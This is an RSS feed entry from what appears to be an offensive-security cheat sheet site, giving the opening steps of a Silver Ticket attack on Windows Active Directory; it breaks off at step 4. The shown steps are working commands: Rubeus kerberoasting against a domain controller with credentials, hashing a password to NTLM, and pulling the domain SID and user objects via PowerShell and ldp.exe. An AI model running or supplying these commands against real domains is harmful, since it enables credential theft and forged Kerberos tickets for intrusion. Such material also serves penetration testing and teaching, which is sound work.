channel.title: Silver Ticket on TLDRBins
channel.description: Recent content in Silver Ticket on TLDRBins

item.title: Silver Ticket
item.description: From Windows 1. Get service principle name (SPN) .\rubeus.exe kerberoast /domain:example.com /dc:dc.example.com /creduser:example.com\username /credpassword:password /nowrap 2. Generate NTLM .\rubeus.exe hash /password:password 3. Get domain SID Locally import-module activedirectory Get-ADDomain | fl DomainSID Remotely # Install ldp.exe (Windows 11) Settings > System > Optional Features > More Windows Features and add 'Active Driectory Lightweight Directory Services' # Bind > Bind with credentials ldp.exe # Browse > Search BaseDN: DC=example,DC=com Filter: (objectclass=User) 4.
